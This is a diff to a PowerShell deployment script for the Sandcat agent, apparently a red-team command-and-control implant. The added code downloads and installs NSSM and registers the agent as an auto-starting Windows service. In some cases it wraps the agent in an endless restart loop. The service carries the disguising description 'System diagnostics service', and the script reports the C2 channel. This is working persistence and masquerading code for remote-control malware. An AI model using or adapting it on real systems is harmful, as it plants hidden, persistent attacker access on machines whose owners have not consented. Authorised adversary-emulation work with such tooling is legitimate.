@@ -96,6 +96,124 @@ function Write-Status {
 }
 
 # --------------------------------------------------------------
+# Helper: download and install NSSM if not already present
+#         NSSM is required for reliable service installation
+#         because Sandcat is a foreground app, not a native service
+# --------------------------------------------------------------
+function Install-NSSM {
+    # Check if NSSM is already on PATH
+    $existing = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
+    if ($existing) {
+        Write-Status "NSSM already available at: $($existing.Source)" -Level "OK"
+        return $true
+    }
+
+    Write-Status "NSSM not found - downloading and installing..."
+
+    try {
+        $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
+
+        # Use C:\Windows\Temp instead of $env:TEMP to avoid user profile path issues
+        $tempDir = "C:\Windows\Temp"
+        if (-not (Test-Path $tempDir)) {
+            $tempDir = [System.IO.Path]::GetTempPath().TrimEnd('\')
+        }
+
+        $nssmZip = Join-Path $tempDir "nssm-2.24.zip"
+        $nssmExtractDir = Join-Path $tempDir "nssm-extract"
+        $nssmInstallDir = "C:\Tools\nssm"
+
+        # Clean up any previous failed attempts
+        if (Test-Path $nssmExtractDir) {
+            Remove-Item -Recurse -Force $nssmExtractDir -ErrorAction SilentlyContinue
+        }
+
+        # Download NSSM
+        Write-Status "Downloading NSSM from nssm.cc..."
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest -Uri $nssmUrl -OutFile $nssmZip -UseBasicParsing -ErrorAction Stop
+
+        # Verify download
+        if (-not (Test-Path $nssmZip)) {
+            Write-Status "Download failed - ZIP file not found" -Level "ERROR"
+            return $false
+        }
+        $zipSize = (Get-Item $nssmZip).Length
+        Write-Status "Downloaded $zipSize bytes"
+
+        # Extract using .NET ZipFile (more reliable than Expand-Archive)
+        Write-Status "Extracting NSSM..."
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($nssmZip, $nssmExtractDir)
+
+        # Find nssm.exe in the extracted files (handle any directory structure)
+        $arch = if ([Environment]::Is64BitOperatingSystem) { "win64" } else { "win32" }
+        $nssmExe = Get-ChildItem -Path $nssmExtractDir -Recurse -Filter "nssm.exe" |
+            Where-Object { $_.DirectoryName -like "*$arch*" } |
+            Select-Object -First 1 -ExpandProperty FullName
+
+        if (-not $nssmExe) {
+            Write-Status "NSSM binary not found after extraction" -Level "ERROR"
+            Write-Status "Looking for any nssm.exe in extracted files..." -Level "INFO"
+            $anyNssm = Get-ChildItem -Path $nssmExtractDir -Recurse -Filter "nssm.exe"
+            if ($anyNssm) {
+                Write-Status "Found: $($anyNssm.FullName)" -Level "INFO"
+                $nssmExe = $anyNssm[0].FullName
+            } else {
+                Write-Status "No nssm.exe found anywhere in the ZIP" -Level "ERROR"
+                return $false
+            }
+        }
+
+        Write-Status "Found NSSM binary at: $nssmExe"
+
+        # Install to C:\Tools\nssm
+        Write-Status "Installing NSSM to $nssmInstallDir..."
+        if (-not (Test-Path $nssmInstallDir)) {
+            New-Item -ItemType Directory -Path $nssmInstallDir -Force | Out-Null
+        }
+
+        Copy-Item -Path $nssmExe -Destination "$nssmInstallDir\nssm.exe" -Force
+
+        # Add to system PATH permanently
+        $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+        if ($currentPath -notlike "*$nssmInstallDir*") {
+            Write-Status "Adding NSSM to system PATH..."
+            $newPath = $currentPath + ";" + $nssmInstallDir
+            [Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
+        }
+
+        # Add to current session PATH
+        $env:PATH += ";$nssmInstallDir"
+
+        # Cleanup
+        Remove-Item -Force $nssmZip -ErrorAction SilentlyContinue
+        Remove-Item -Recurse -Force $nssmExtractDir -ErrorAction SilentlyContinue
+
+        # Verify installation
+        $installed = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
+        if ($installed) {
+            Write-Status "NSSM installed successfully to: $nssmInstallDir" -Level "OK"
+            $version = & nssm.exe version 2>&1
+            Write-Status "NSSM version: $version" -Level "OK"
+            return $true
+        } else {
+            Write-Status "NSSM binary copied but not found on PATH" -Level "WARN"
+            Write-Status "Restart PowerShell or run: `$env:PATH += ';$nssmInstallDir'" -Level "INFO"
+            # Return true anyway since the binary is installed, just needs PATH refresh
+            return $true
+        }
+    }
+    catch {
+        Write-Status "Failed to install NSSM: $_" -Level "ERROR"
+        Write-Status "Manual installation: Download from https://nssm.cc, extract, and run:" -Level "INFO"
+        Write-Status "  Copy-Item nssm.exe C:\Tools\nssm\nssm.exe" -Level "INFO"
+        Write-Status "  `$env:PATH += ';C:\Tools\nssm'" -Level "INFO"
+        return $false
+    }
+}
+
+# --------------------------------------------------------------
 # Helper: kill any existing process running from AgentPath,
 #         then delete the file - mirrors the one-liner's pattern
 # --------------------------------------------------------------
@@ -246,29 +364,73 @@ function Install-SandcatService {
         return
     }
 
-    # -- Option B: sc.exe + restart-loop batch wrapper ---------
-    Write-Status "NSSM not found - falling back to sc.exe wrapper" -Level "WARN"
+    # -- Option B: sc.exe service wrapper ----------------------
+    # For paths without spaces, we can invoke the binary directly as a service.
+    # For paths with spaces, we need a batch wrapper.
+    Write-Status "NSSM not found - using sc.exe" -Level "WARN"
 
-    $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
-    $line1 = '@echo off'
-    $line2 = ':loop'
-    $line3 = '"' + $AgentBin + '" ' + $argList
-    $line4 = 'timeout /t 10 /nobreak >nul'
-    $line5 = 'goto loop'
-    $wrapperContent = $line1 + "`r`n" + $line2 + "`r`n" + $line3 + "`r`n" + $line4 + "`r`n" + $line5
-    Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII
+    $hasSpaces = $AgentBin -match '\s'
 
-    $binPath = 'cmd.exe /c "' + $wrapperPath + '"'
-    sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name | Out-Null
+    if (-not $hasSpaces) {
+        # Direct binary invocation - cleaner and more reliable
+        Write-Status "Path has no spaces - registering binary directly as service"
+        $binPath = "$AgentBin $argList"
+
+        $createResult = sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            Write-Status "sc.exe create failed: $createResult" -Level "ERROR"
+            return
+        }
+
+    } else {
+        # Batch wrapper required for paths with spaces
+        Write-Status "Path contains spaces - using batch wrapper"
+        $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
+        $line1 = '@echo off'
+        $line2 = ':loop'
+        $line3 = '"' + $AgentBin + '" ' + $argList
+        $line4 = 'timeout /t 10 /nobreak >nul'
+        $line5 = 'goto loop'
+        $wrapperContent = $line1 + "`r`n" + $line2 + "`r`n" + $line3 + "`r`n" + $line4 + "`r`n" + $line5
+        Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII
+        Write-Status "Wrapper written to: $wrapperPath"
+
+        $binPath = "cmd.exe /c \`"$wrapperPath\`""
+
+        $createResult = sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            Write-Status "sc.exe create failed: $createResult" -Level "ERROR"
+            return
+        }
+    }
+
     sc.exe description $Name "System diagnostics service" | Out-Null
-    sc.exe start $Name | Out-Null
 
-    Start-Sleep -Seconds 2
+    Write-Status "Starting service '$Name'..."
+    $startResult = sc.exe start $Name 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        Write-Status "sc.exe start failed (exit $LASTEXITCODE)" -Level "ERROR"
+        Write-Status "$startResult" -Level "ERROR"
+        Write-Status "Common causes:" -Level "INFO"
+        Write-Status "  - Agent binary missing or corrupted" -Level "INFO"
+        Write-Status "  - Server URL unreachable from service account (LocalSystem)" -Level "INFO"
+        Write-Status "  - Antivirus blocking execution" -Level "INFO"
+        if ($hasSpaces) {
+            Write-Status "  - Try manually: $wrapperPath" -Level "INFO"
+        } else {
+            Write-Status "  - Try manually: $AgentBin $argList" -Level "INFO"
+        }
+        return
+    }
+
+    Start-Sleep -Seconds 3
     $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -eq "Running") {
         Write-Status "Service '$Name' is running" -Level "OK"
     } else {
-        Write-Status "Service '$Name' may not have started cleanly - verify with: Get-Service '$Name'" -Level "WARN"
+        $status = if ($svc) { $svc.Status } else { "NOT FOUND" }
+        Write-Status "Service created but status is: $status" -Level "WARN"
+        Write-Status "Check: Get-EventLog -LogName System -Source 'Service Control Manager' -Newest 10" -Level "INFO"
     }
 }
 
@@ -297,6 +459,15 @@ Write-Status " Group   : $Group"
 Write-Status " C2      : $C2Channel"
 Write-Status " Path    : $AgentPath"
 Write-Status "==============================================="
+
+# 0. If service mode is requested, ensure NSSM is available
+if ($InstallAsService) {
+    Write-Status "Service installation requested - checking for NSSM..."
+    $nssmOk = Install-NSSM
+    if (-not $nssmOk) {
+        Write-Status "Proceeding without NSSM - will use sc.exe fallback (less reliable)" -Level "WARN"
+    }
+}
 
 # 1. Confirm server is reachable
 Write-Status "Checking server connectivity..."
